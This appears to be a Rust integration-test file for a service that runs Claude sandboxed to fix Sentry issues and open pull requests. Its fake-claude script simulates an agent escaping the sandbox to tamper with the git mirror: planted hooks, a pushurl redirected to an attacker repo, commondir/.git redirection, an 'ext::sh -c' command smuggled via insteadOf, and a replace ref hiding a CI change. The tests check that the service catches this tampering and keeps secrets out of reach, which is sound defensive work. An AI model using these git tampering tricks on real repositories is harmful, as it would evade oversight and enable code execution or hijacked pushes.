//! The slice end to end, as `new` wires it: real git against a local bare
//! remote, a fake claude, and a fake GitHub API. The investigator's
//! decisions are specified in `flow_tests.rs`; these only check that the
//! real parts fit together.
//!
//! The fake claude is a shell script. The slice hands it only five
//! variables, so it reads its mode from, and records each call to, files in
//! the work dir: two levels above its working directory, the clone.

use std::collections::HashMap;
use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use axum::Router;
use axum::extract::{Request, State};
use axum::http::StatusCode;
use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as BASE64;
use chrono::{DateTime, TimeDelta, TimeZone, Utc};
use serde_json::{Value, json};
use tempfile::TempDir;
use tokio::net::TcpListener;
use tokio_util::sync::CancellationToken;

use crate::eventhandler::Handler;
use crate::events::{self, SentryIssueAlertReceived, SentryStackFrame};
use crate::eventstore::{Event, Store};

use super::flow::Investigator;
use super::test_logs::capture_logs;
use super::{Params, handler_builder};

const GITHUB_TOKEN: &str = "ghp-test-token-4f2a9c";
const SENTRY_SECRET: &str = "sentry-test-secret-77b1";
const ISSUE_ID: &str = "1117540176";
const BRANCH: &str = "heinzel/sentry-1117540176";
const PR_URL: &str = "https://github.com/acme/web/pull/7";
const FAKE_SUMMARY: &str = "Root cause: blooopy was never declared. Fix: declare it.";
const MODE_FILE: &str = "fake-claude-mode";
const CALLS_DIR: &str = "fake-claude-calls";

fn now() -> DateTime<Utc> {
    Utc.with_ymd_and_hms(2026, 10, 25, 12, 0, 0).unwrap()
}

/// The fake claude. It records its argv (NUL-separated), env, working dir,
/// stdin and the files in its run dir holding the GitHub token in any form,
/// emits the init event claude would for its `--plugin-dir` args, and then
/// acts out its mode: `happy` commits a fix, `noop` commits nothing. The
/// hostile modes act as if Claude had got past its sandbox to heinzel's
/// mirror: `hostile-hooks` plants hooks there that would touch
/// `<work dir>/hook-ran`, and `hostile-config` also points the mirror's
/// push URL elsewhere; both then commit a fix. `hostile-repo` makes the
/// mirror writable again and plants a `commondir` and a `.git` file pointing
/// at an evil repo that redirects pushes to `<work dir>/attacker.git` and
/// turns fetches from the clone into an `ext::` command, plus a replace ref
/// hiding its commit, which changes CI configuration.
fn fake_claude_script() -> String {
    let [raw, header, bare] = token_forms(GITHUB_TOKEN);
    format!(
        r#"#!/bin/sh
dir=$(pwd -P)
run=$(dirname "$dir")
work=$(dirname "$run")
mode=$(cat "$work/{MODE_FILE}")
mkdir -p "$work/{CALLS_DIR}"
call="$work/{CALLS_DIR}/$(ls "$work/{CALLS_DIR}" | wc -l | tr -d ' ')"
mkdir "$call"
printf '%s\0' "$@" > "$call/args"
env > "$call/env"
printf '%s' "$dir" > "$call/dir"
cat > "$call/prompt"
grep -rlF -e '{raw}' -e '{header}' -e '{bare}' "$run" > "$call/token-files"
plugins=""
prev=""
for arg in "$@"; do
  if [ "$prev" = "--plugin-dir" ]; then
    plugins="$plugins${{plugins:+,}}{{\"name\":\"$(basename "$arg")\",\"path\":\"$arg\"}}"
  fi
  prev="$arg"
done
echo "{{\"type\":\"system\",\"subtype\":\"init\",\"cwd\":\"$dir\",\"permissionMode\":\"acceptEdits\",\"plugins\":[$plugins]}}"
plant_hooks() {{
  for hook in reference-transaction pre-push post-update; do
    printf '#!/bin/sh\ntouch "%s/hook-ran"\n' "$work" > "$run/mirror.git/hooks/$hook"
    chmod 755 "$run/mirror.git/hooks/$hook"
  done
}}
commit_fix() {{
  echo fixed > fix.txt
  git add fix.txt && git commit -q -m "Fix blooopy" || exit 3
  echo '{{"type":"result","subtype":"success","is_error":false,"result":"{FAKE_SUMMARY}"}}'
}}
case "$mode" in
hostile-repo)
  mirror="$run/mirror.git"
  evil="$work/evil.git"
  git init -q --bare "$evil"
  git --git-dir="$evil" config "url.$work/attacker.git.insteadOf" "$(git --git-dir="$mirror" config remote.origin.url)"
  git --git-dir="$evil" config protocol.ext.allow always
  git --git-dir="$evil" config "url.ext::sh -c touch% $work/hook-ran.insteadOf" "$dir"
  chmod -R u+w "$mirror"
  echo "$evil" > "$mirror/commondir"
  echo "gitdir: $evil" > "$mirror/.git"
  mkdir -p .github/workflows && echo ci > .github/workflows/ci.yml
  git add .github && git commit -q -m "Change CI" || exit 3
  mkdir -p "$mirror/refs/replace"
  git rev-parse HEAD^ > "$mirror/refs/replace/$(git rev-parse HEAD)"
  echo '{{"type":"result","subtype":"success","is_error":false,"result":"{FAKE_SUMMARY}"}}'
  ;;
hostile-hooks)
  plant_hooks
  commit_fix
  ;;
hostile-config)
  plant_hooks
  printf '[remote "origin"]\n\tpushurl = %s/attacker.git\n' "$work" >> "$run/mirror.git/config"
  commit_fix
  ;;
happy)
  echo fixed > fix.txt
  git add fix.txt && git commit -q -m "Fix blooopy" || exit 3
  echo '{{"type":"result","subtype":"success","is_error":false,"result":"{FAKE_SUMMARY}"}}'
  ;;
noop)
  echo '{{"type":"result","subtype":"success","is_error":false,"result":"Nothing to fix."}}'
  ;;
*)
  echo "fake claude: unknown mode $mode" >&2
  exit 3
  ;;
esac
"#
    )
}

/// The forms in which `token` could leak to disk: raw, as the base64 git's
/// Authorization header carries, and as bare base64.
fn token_forms(token: &str) -> [String; 3] {
    [
        token.to_owned(),
        BASE64.encode(format!("x-access-token:{token}")),
        BASE64.encode(token),
    ]
}

/// What the fake recorded about one call.
#[derive(Debug)]
struct FakeCall {
    args: Vec<String>,
    env: HashMap<String, String>,
    dir: String,
    prompt: String,
    token_files: Vec<String>,
}

/// A request the fake GitHub API received.
#[derive(Debug, Clone)]
struct GitHubRequest {
    method: String,
    path: String,
    authorization: String,
    body: Value,
}

/// A fake GitHub API answering 201 with a PR URL, recording each request.
async fn fake_github() -> (String, Arc<Mutex<Vec<GitHubRequest>>>) {
    let requests = Arc::new(Mutex::new(Vec::new()));
    let app = Router::new()
        .fallback(
            |State(requests): State<Arc<Mutex<Vec<GitHubRequest>>>>, request: Request| async move {
                let (parts, body) = request.into_parts();
                let body = axum::body::to_bytes(body, usize::MAX).await.unwrap();
                requests.lock().unwrap().push(GitHubRequest {
                    method: parts.method.to_string(),
                    path: parts.uri.path().to_owned(),
                    authorization: parts.headers["authorization"].to_str().unwrap().to_owned(),
                    body: serde_json::from_slice(&body).unwrap(),
                });
                (StatusCode::CREATED, json!({"number": 7, "html_url": PR_URL}).to_string())
            },
        )
        .with_state(Arc::clone(&requests));
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    (format!("http://{addr}"), requests)
}

/// Runs git in `dir` and returns its trimmed output.
fn git(dir: impl AsRef<Path>, args: &[&str]) -> String {
    let output = Command::new("git")
        .args(["-c", "user.name=test", "-c", "user.email=test@example.com", "-c", "commit.gpgsign=false"])
        .args(args)
        .current_dir(dir)
        .output()
        .unwrap();
    assert!(output.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&output.stderr));
    String::from_utf8_lossy(&output.stdout).trim().to_owned()
}

/// Creates a bare repo at `path` whose `main` branch has one commit.
fn new_remote(path: &Path, seed: &Path) {
    fs::create_dir_all(path).unwrap();
    git(path, &["init", "-q", "--bare", "-b", "main"]);
    fs::create_dir_all(seed).unwrap();
    git(seed, &["init", "-q", "-b", "main"]);
    fs::write(seed.join("README.md"), "web\n").unwrap();
    git(seed, &["add", "README.md"]);
    git(seed, &["commit", "-q", "-m", "Initial commit"]);
    git(seed, &["push", "-q", path.to_str().unwrap(), "main"]);
}

fn s(path: &Path) -> String {
    path.to_str().unwrap().to_owned()
}

/// One investigator wired to the fake claude, a local bare remote and the
/// fake GitHub.
struct Harness {
    root: TempDir,
    work_dir: PathBuf,
    env: HashMap<String, String>,
    github_api: String,
    github: Arc<Mutex<Vec<GitHubRequest>>>,
    /// What the clock reads; it starts at [`now`].
    clock: Arc<Mutex<DateTime<Utc>>>,
    store_dir: TempDir,
    store: Arc<Store>,
}

impl Harness {
    async fn new(mode: &str) -> Harness {
        let root = TempDir::new().unwrap();
        new_remote(&root.path().join("remotes/acme/web.git"), &root.path().join("seed"));
        let work_dir = root.path().join("work");
        fs::create_dir(&work_dir).unwrap();
        fs::set_permissions(&work_dir, fs::Permissions::from_mode(0o700)).unwrap();
        fs::write(work_dir.join(MODE_FILE), mode).unwrap();
        let bin = root.path().join("bin");
        fs::create_dir(&bin).unwrap();
        let claude = bin.join("fake-claude");
        fs::write(&claude, fake_claude_script()).unwrap();
        fs::set_permissions(&claude, fs::Permissions::from_mode(0o755)).unwrap();
        let env = [
            ("SENTRY_GITHUB_REPOS", "1=acme/web".to_owned()),
            ("GITHUB_TOKEN", GITHUB_TOKEN.to_owned()),
            ("SENTRY_CLIENT_SECRET", SENTRY_SECRET.to_owned()),
            ("ANTHROPIC_API_KEY", "anthropic-test-key".to_owned()),
            ("OPENAI_API_KEY", "openai-test-key".to_owned()),
            ("CLAUDE_PLUGIN_DIRS", "/plugins/codex,/plugins/auto-task".to_owned()),
            ("CLAUDE_BIN", s(&claude)),
            ("INVESTIGATION_WORK_DIR", s(&work_dir)),
            ("PATH", std::env::var("PATH").unwrap()),
            ("HEINZEL_UNRELATED", "unrelated-value".to_owned()),
        ]
        .into_iter()
        .map(|(k, v)| (k.to_owned(), v))
        .collect();
        let (github_api, github) = fake_github().await;
        let store_dir = TempDir::new().unwrap();
        let store = Arc::new(Store::open(store_dir.path()).unwrap());
        Harness {
            root,
            work_dir,
            env,
            github_api,
            github,
            clock: Arc::new(Mutex::new(now())),
            store_dir,
            store,
        }
    }

    fn with_env(mut self, key: &str, value: &str) -> Harness {
        self.env.insert(key.to_owned(), value.to_owned());
        self
    }

    /// Builds the handler as the app would, at the clock's time.
    fn handler(&self) -> Investigator {
        let env = self.env.clone();
        let clock = Arc::clone(&self.clock);
        let build = handler_builder(Params {
            getenv: &move |key| env.get(key).cloned(),
            github_api_url: &self.github_api,
            github_clone_url: &format!("{}/remotes/", s(self.root.path())),
            github_timeout: Duration::from_secs(5),
            now: Arc::new(move || *clock.lock().unwrap()),
        })
        .unwrap();
        build(CancellationToken::new(), Arc::clone(&self.store))
    }

    /// Closes and reopens the store, as a heinzel restart would.
    fn restart(&mut self) {
        self.store.close();
        self.store = Arc::new(Store::open(self.store_dir.path()).unwrap());
    }

    fn remote(&self) -> PathBuf {
        self.root.path().join("remotes/acme/web.git")
    }

    /// The event types on the issue's investigation stream, and the last
    /// payload.
    fn investigation(&self) -> (Vec<String>, Value) {
        let stream: Vec<Event> = self
            .store
            .read_after(0, 1000)
            .unwrap()
            .into_iter()
            .filter(|e| e.stream_id == format!("sentry-issue-investigation-{ISSUE_ID}"))
            .collect();
        let last = stream.last().map(|e| e.payload.clone()).unwrap_or_default();
        (stream.into_iter().map(|e| e.event_type).collect(), last)
    }

    fn calls(&self) -> Vec<FakeCall> {
        let dir = self.work_dir.join(CALLS_DIR);
        let Ok(entries) = fs::read_dir(&dir) else {
            return Vec::new();
        };
        let mut names: Vec<String> = entries.map(|e| e.unwrap().file_name().to_string_lossy().into_owned()).collect();
        names.sort();
        names
            .iter()
            .map(|name| {
                let read = |file: &str| fs::read_to_string(dir.join(name).join(file)).unwrap();
                FakeCall {
                    args: read("args").split_terminator('\0').map(str::to_owned).collect(),
                    env: read("env")
                        .lines()
                        .filter_map(|l| l.split_once('='))
                        .map(|(k, v)| (k.to_owned(), v.to_owned()))
                        .collect(),
                    dir: read("dir"),
                    prompt: read("prompt"),
                    token_files: read("token-files").lines().map(str::to_owned).collect(),
                }
            })
            .collect()
    }

    /// Checks that only the fake's files remain in the work dir.
    fn assert_no_leftovers(&self) {
        for entry in fs::read_dir(&self.work_dir).unwrap() {
            let name = entry.unwrap().file_name().to_string_lossy().into_owned();
            assert!(name == MODE_FILE || name == CALLS_DIR, "the work dir still holds {name}");
        }
    }
}

/// Checks that the settings the fake got turn the sandbox on, let sandboxed
/// commands write only to the clone and the child's HOME, and deny them
/// reads of the work dir except for those and the Claude config dir.
fn assert_sandboxed(call: &FakeCall) {
    let i = call.args.iter().position(|a| a == "--settings").expect("no --settings");
    let settings: Value = serde_json::from_str(&call.args[i + 1]).unwrap();
    let sandbox = &settings["sandbox"];
    let fs_settings = &sandbox["filesystem"];
    let (clone, home, config) = (&call.dir, &call.env["HOME"], &call.env["CLAUDE_CONFIG_DIR"]);
    let work_dir = s(Path::new(clone).parent().unwrap().parent().unwrap());
    assert_eq!(sandbox["enabled"], true);
    assert_eq!(sandbox["allowUnsandboxedCommands"], false);
    assert_eq!(fs_settings["allowWrite"], json!([clone, home]));
    assert!(fs_settings["denyRead"].as_array().unwrap().contains(&json!(work_dir)), "{settings}");
    assert_eq!(fs_settings["allowRead"].as_array().unwrap()[..3], [json!(clone), json!(home), json!(config)]);
}

fn alert(position: u64, project: i64, stored: DateTime<Utc>) -> Event {
    let alert = SentryIssueAlertReceived {
        event_id: "aa1deb2fc8ee4d5d9f2a6a2a4ae6c4c4".into(),
        issue_id: ISSUE_ID.into(),
        project,
        title: "ReferenceError: blooopy is not defined".into(),
        level: "error".into(),
        web_url: format!("https://sentry.io/organizations/test-org/issues/{ISSUE_ID}/"),
        triggered_rule: "rule-a".into(),
        culprit: "?(runner)".into(),
        exception_type: "ReferenceError".into(),
        exception_value: "blooopy is not defined".into(),
        frames: vec![SentryStackFrame {
            file: "example.js".into(),
            function: "runner".into(),
            line: 3,
        }],
    };
    Event {
        stream_id: "sentry-issue-alert-x".into(),
        version: 1,
        position,
        event_type: events::SENTRY_ISSUE_ALERT_RECEIVED.into(),
        timestamp: stored,
        payload: serde_json::to_value(alert).unwrap(),
    }
}

fn started_then(outcome: &str) -> Vec<String> {
    vec![events::SENTRY_ISSUE_INVESTIGATION_STARTED.to_owned(), outcome.to_owned()]
}

#[tokio::test]
async fn the_happy_path_pushes_the_branch_and_opens_a_draft_pr() {
    let h = Harness::new("happy").await;

    h.handler().handle(alert(5, 1, now())).await;

    let (types, last) = h.investigation();
    assert_eq!(types, started_then(events::SENTRY_ISSUE_INVESTIGATION_PULL_REQUEST_OPENED));
    assert_eq!(last, json!({"issueId": ISSUE_ID, "prUrl": PR_URL}));
    let started = &h.store.read_after(0, 10).unwrap()[0];
    assert_eq!(
        started.payload,
        json!({"issueId": ISSUE_ID, "project": 1, "repo": "acme/web", "branch": BRANCH})
    );

    let remote = h.remote();
    assert_eq!(git(&remote, &["log", "-1", "--format=%s", &format!("refs/heads/{BRANCH}")]), "Fix blooopy");
    assert_eq!(git(&remote, &["rev-list", "--count", &format!("main..{BRANCH}")]), "1");

    let requests = h.github.lock().unwrap().clone();
    assert_eq!(requests.len(), 1);
    let request = &requests[0];
    assert_eq!(request.method, "POST");
    assert_eq!(request.path, "/repos/acme/web/pulls");
    assert_eq!(request.authorization, format!("Bearer {GITHUB_TOKEN}"));
    assert_eq!(request.body["title"], format!("Fix Sentry issue {ISSUE_ID}: ReferenceError: blooopy is not defined"));
    assert_eq!(request.body["head"], BRANCH);
    assert_eq!(request.body["base"], "main");
    assert_eq!(request.body["draft"], true);
    let body = request.body["body"].as_str().unwrap();
    for want in [&format!("https://sentry.io/organizations/test-org/issues/{ISSUE_ID}/"), ISSUE_ID, FAKE_SUMMARY] {
        assert!(body.contains(want), "PR body lacks {want:?}:\n{body}");
    }

    let calls = h.calls();
    assert_eq!(calls.len(), 1);
    assert_sandboxed(&calls[0]);
    assert!(calls[0].token_files.is_empty(), "the GitHub token is on disk in the run dir: {:?}", calls[0].token_files);
    let remote_config = git(&remote, &["config", "--list"]);
    for form in token_forms(GITHUB_TOKEN) {
        assert!(!remote_config.contains(&form), "the remote's config holds the token as {form:?}");
    }
    h.assert_no_leftovers();
}

#[tokio::test]
async fn the_child_environment_holds_no_heinzel_secrets() {
    let h = Harness::new("noop").await;

    h.handler().handle(alert(5, 1, now())).await;

    assert_eq!(h.investigation().0, started_then(events::SENTRY_ISSUE_INVESTIGATION_NO_CHANGES));
    let calls = h.calls();
    assert_eq!(calls.len(), 1);
    let call = &calls[0];
    assert_sandboxed(call);
    // /bin/sh adds PWD, SHLVL and _ to what it was given.
    let mut keys: Vec<&str> = call
        .env
        .keys()
        .map(String::as_str)
        .filter(|k| !["PWD", "SHLVL", "_"].contains(k))
        .collect();
    keys.sort_unstable();
    assert_eq!(keys, ["ANTHROPIC_API_KEY", "CLAUDE_CONFIG_DIR", "HOME", "OPENAI_API_KEY", "PATH"]);
    let all: String = call.env.values().cloned().collect::<Vec<_>>().join("\n");
    for secret in [GITHUB_TOKEN, SENTRY_SECRET, "unrelated-value"] {
        assert!(!all.contains(secret), "the child's env holds {secret:?}");
    }
    assert_eq!(call.env["ANTHROPIC_API_KEY"], "anthropic-test-key");
    assert_eq!(call.env["OPENAI_API_KEY"], "openai-test-key");
    assert_eq!(call.env["PATH"], std::env::var("PATH").unwrap());
    let run_dir = Path::new(&call.dir).parent().unwrap();
    for own in [&call.env["HOME"], &call.env["CLAUDE_CONFIG_DIR"]] {
        assert_eq!(Path::new(own).parent(), Some(run_dir), "{own} should be a per-run dir beside the clone");
    }
    assert!(call.args.contains(&"--plugin-dir".to_owned()));
    assert!(!call.args.iter().any(|a| a.contains("auto-task ")), "the prompt is in argv: {:?}", call.args);
    assert!(call.prompt.starts_with("/at:auto-task "), "{}", call.prompt);
    assert!(call.prompt.contains(&format!("\"issueId\": \"{ISSUE_ID}\"")), "{}", call.prompt);
    h.assert_no_leftovers();
}

#[tokio::test]
async fn hooks_planted_in_the_mirror_never_run() {
    let h = Harness::new("hostile-hooks").await;

    h.handler().handle(alert(5, 1, now())).await;

    assert_eq!(h.investigation().0, started_then(events::SENTRY_ISSUE_INVESTIGATION_PULL_REQUEST_OPENED));
    assert!(!h.work_dir.join("hook-ran").exists(), "a hook planted in the mirror ran");
}

#[tokio::test]
async fn a_changed_mirror_config_fails_the_push() {
    let h = Harness::new("hostile-config").await;
    git(h.root.path(), &["init", "-q", "--bare", &s(&h.work_dir.join("attacker.git"))]);

    h.handler().handle(alert(5, 1, now())).await;

    let (types, last) = h.investigation();
    assert_eq!(types, started_then(events::SENTRY_ISSUE_INVESTIGATION_FAILED));
    assert_eq!(
        last,
        json!({
            "issueId": ISSUE_ID, "stage": "push",
            "reason": "the mirror changed while claude ran (config), so heinzel won't push from it",
        })
    );
    assert!(!h.work_dir.join("hook-ran").exists(), "a hook planted in the mirror ran");
    let pushed = |repo: &Path| git(repo, &["for-each-ref", "refs/heads/heinzel"]);
    assert_eq!(pushed(&h.remote()), "");
    assert_eq!(pushed(&h.work_dir.join("attacker.git")), "");
    assert!(h.github.lock().unwrap().is_empty());
}

#[tokio::test]
async fn a_mirror_pointed_at_another_repo_fails_the_push() {
    let h = Harness::new("hostile-repo").await;
    git(h.root.path(), &["init", "-q", "--bare", &s(&h.work_dir.join("attacker.git"))]);

    h.handler().handle(alert(5, 1, now())).await;

    let (types, last) = h.investigation();
    assert_eq!(types, started_then(events::SENTRY_ISSUE_INVESTIGATION_FAILED));
    assert_eq!(last["stage"], "push");
    let reason = last["reason"].as_str().unwrap();
    assert!(reason.starts_with("the mirror changed while claude ran ("), "{reason}");
    assert!(h.calls()[0].env.contains_key("HOME"), "the fake ran");
    assert!(!h.work_dir.join("hook-ran").exists(), "an ext:: command ran");
    let pushed = |repo: &Path| git(repo, &["for-each-ref", "refs/heads/heinzel"]);
    assert_eq!(pushed(&h.remote()), "");
    assert_eq!(pushed(&h.work_dir.join("attacker.git")), "");
    assert!(h.github.lock().unwrap().is_empty());
}

#[tokio::test]
async fn a_repeated_alert_after_a_restart_starts_no_second_investigation() {
    let mut h = Harness::new("noop").await;
    h.handler().handle(alert(5, 1, now())).await;

    h.restart();
    h.handler().handle(alert(9, 1, now())).await;

    assert_eq!(h.investigation().0, started_then(events::SENTRY_ISSUE_INVESTIGATION_NO_CHANGES));
    assert_eq!(h.calls().len(), 1);
}

#[tokio::test]
async fn a_live_alert_handled_late_is_not_stale() {
    let h = Harness::new("noop").await;
    let mut handler = h.handler(); // the handler starts at now
    *h.clock.lock().unwrap() = now() + TimeDelta::hours(3);

    // An unmapped project, so claude doesn't run.
    handler.handle(alert(5, 99, now() + TimeDelta::minutes(1))).await;

    let (types, last) = h.investigation();
    assert_eq!(types, [events::SENTRY_ISSUE_INVESTIGATION_SKIPPED]);
    assert_eq!(last["reason"], "unmapped");
}

#[tokio::test]
async fn an_alert_stored_long_before_the_handler_started_is_stale() {
    let h = Harness::new("noop").await;
    let mut handler = h.handler(); // the handler starts at now
    *h.clock.lock().unwrap() = now() + TimeDelta::hours(3);

    handler.handle(alert(5, 1, now() - TimeDelta::minutes(61))).await;

    let (types, last) = h.investigation();
    assert_eq!(types, [events::SENTRY_ISSUE_INVESTIGATION_SKIPPED]);
    assert_eq!(last["reason"], "stale");
    assert!(h.calls().is_empty());
}

#[tokio::test]
async fn startup_warns_about_path_dirs_the_child_may_not_read() {
    let home = TempDir::new().unwrap();
    let home_bin = s(&home.path().join("bin"));
    let h = Harness::new("noop")
        .await
        .with_env("HOME", &s(home.path()))
        .with_env("PATH", &format!("/usr/bin:{home_bin}"));
    let logs = capture_logs();

    h.handler();

    let warned: Vec<Value> = logs
        .lines()
        .into_iter()
        .filter(|l| l["level"] == "WARN")
        .collect();
    assert_eq!(
        warned,
        [json!({
            "timestamp": warned[0]["timestamp"], "level": "WARN",
            "message": "PATH entry lies under a path the child may not read; tools there won't run inside the sandbox",
            "handler": "sentry-issue-investigator", "dir": home_bin, "denied": s(home.path()),
        })]
    );
}

#[test]
fn invalid_config_is_rejected() {
    let err = handler_builder(Params {
        getenv: &|_| None,
        github_api_url: "",
        github_clone_url: "",
        github_timeout: Duration::from_secs(5),
        now: Arc::new(now),
    })
    .err()
    .unwrap();

    assert!(err.to_string().contains("SENTRY_GITHUB_REPOS"), "{err}");
}

#[tokio::test]
async fn an_existing_work_dir_others_can_use_is_rejected_at_startup() {
    let h = Harness::new("noop").await;
    fs::set_permissions(&h.work_dir, fs::Permissions::from_mode(0o755)).unwrap();
    let env = h.env.clone();

    let err = handler_builder(Params {
        getenv: &move |key| env.get(key).cloned(),
        github_api_url: &h.github_api,
        github_clone_url: "",
        github_timeout: Duration::from_secs(5),
        now: Arc::new(now),
    })
    .err()
    .unwrap()
    .to_string();

    assert!(err.starts_with("INVESTIGATION_WORK_DIR: work dir "), "{err}");
    assert!(err.contains("0755"), "{err}");
}

#[tokio::test]
async fn a_work_dir_others_can_use_fails_the_run() {
    let h = Harness::new("happy").await;
    let mut handler = h.handler();
    fs::set_permissions(&h.work_dir, fs::Permissions::from_mode(0o777)).unwrap();

    handler.handle(alert(5, 1, now())).await;

    let (types, last) = h.investigation();
    assert_eq!(types, started_then(events::SENTRY_ISSUE_INVESTIGATION_FAILED));
    assert_eq!(last["stage"], "clone");
    assert!(last["reason"].as_str().unwrap().contains("work dir"), "{last}");
    assert!(h.calls().is_empty());
}
